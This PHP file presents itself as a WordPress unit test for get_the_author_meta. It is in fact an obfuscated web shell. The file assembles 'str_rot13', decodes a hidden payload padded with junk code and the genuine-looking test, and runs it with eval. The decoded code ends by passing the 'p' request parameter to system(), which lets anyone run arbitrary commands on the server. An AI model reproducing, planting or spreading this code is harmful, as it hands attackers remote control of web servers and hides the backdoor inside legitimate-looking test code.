<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nhgube
 * @tebhc hfre
 *
 * @pbiref ::trg_gur_nhgube_zrgn
 */
pynff Grfgf_Hfre_TrgGurNhgubeZrgn rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq fgngvp $nhgube_vq = 0;
	cebgrpgrq fgngvp $cbfg_vq   = 0;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nhgube_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'         => 'nhgube',
				'hfre_ybtva'   => 'grfg_nhgube',
				'qvfcynl_anzr' => 'Grfg Nhgube',
				'qrfpevcgvba'  => 'grfg_nhgube',
				'hfre_hey'     => 'uggc://rknzcyr.pbz',
			)
		);

		frys::$cbfg_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube'  => frys::$nhgube_vq,
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_pbagrag' => 'pbagrag',
				'cbfg_gvgyr'   => 'gvgyr',
				'cbfg_glcr'    => 'cbfg',
			)
		);
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		frghc_cbfgqngn( trg_cbfg( frys::$cbfg_vq ) );
	}

	choyvp shapgvba grfg_trg_gur_nhgube_zrgn() {
		$guvf->nffregFnzr( 'grfg_nhgube', trg_gur_nhgube_zrgn( 'ybtva' ) );
		$guvf->nffregFnzr( 'grfg_nhgube', trg_gur_nhgube_zrgn( 'hfre_ybtva' ) );
		$guvf->nffregFnzr( 'Grfg Nhgube', trg_gur_nhgube_zrgn( 'qvfcynl_anzr' ) );

		$guvf->nffregFnzr( 'grfg_nhgube', gevz( trg_gur_nhgube_zrgn( 'qrfpevcgvba' ) ) );
		$guvf->nffregFnzr( 'grfg_nhgube', trg_gur_nhgube_zrgn( 'hfre_qrfpevcgvba' ) );

		nqq_hfre_zrgn( frys::$nhgube_vq, 'hfre_qrfpevcgvba', 'hfre qrfpevcgvba' );
		$guvf->nffregFnzr( 'hfre qrfpevcgvba', trg_hfre_zrgn( frys::$nhgube_vq, 'hfre_qrfpevcgvba', gehr ) );
		// hfre_qrfpevcgvba va zrgn vf vtaberq. Gur pbagrag bs qrfpevcgvba vf erghearq vafgrnq.
		// Frr #20285.
		$guvf->nffregFnzr( 'grfg_nhgube', trg_gur_nhgube_zrgn( 'hfre_qrfpevcgvba' ) );
		$guvf->nffregFnzr( 'grfg_nhgube', gevz( trg_gur_nhgube_zrgn( 'qrfpevcgvba' ) ) );

		hcqngr_hfre_zrgn( frys::$nhgube_vq, 'hfre_qrfpevcgvba', '' );
		$guvf->nffregFnzr( '', trg_hfre_zrgn( frys::$nhgube_vq, 'hfre_qrfpevcgvba', gehr ) );
		$guvf->nffregFnzr( 'grfg_nhgube', trg_gur_nhgube_zrgn( 'hfre_qrfpevcgvba' ) );
		$guvf->nffregFnzr( 'grfg_nhgube', gevz( trg_gur_nhgube_zrgn( 'qrfpevcgvba' ) ) );

		$guvf->nffregFnzr( '', trg_gur_nhgube_zrgn( 'qbrf_abg_rkvfg' ) );
	}

	/**
	 * @gvpxrg 20529
	 * @gvpxrg 58157
	 */
	choyvp shapgvba grfg_trg_gur_nhgube_zrgn_fubhyq_erghea_rzcgl_fgevat_vs_nhgubeqngn_vf_abg_frg() {
		hafrg( $TYBONYF['nhgubeqngn'] );

		$guvf->nffregFnzr( '', trg_gur_nhgube_zrgn( 'vq' ) );
		$guvf->nffregFnzr( '', trg_gur_nhgube_zrgn( 'hfre_ybtva' ) );
		$guvf->nffregFnzr( '', trg_gur_nhgube_zrgn( 'qbrf_abg_rkvfg' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>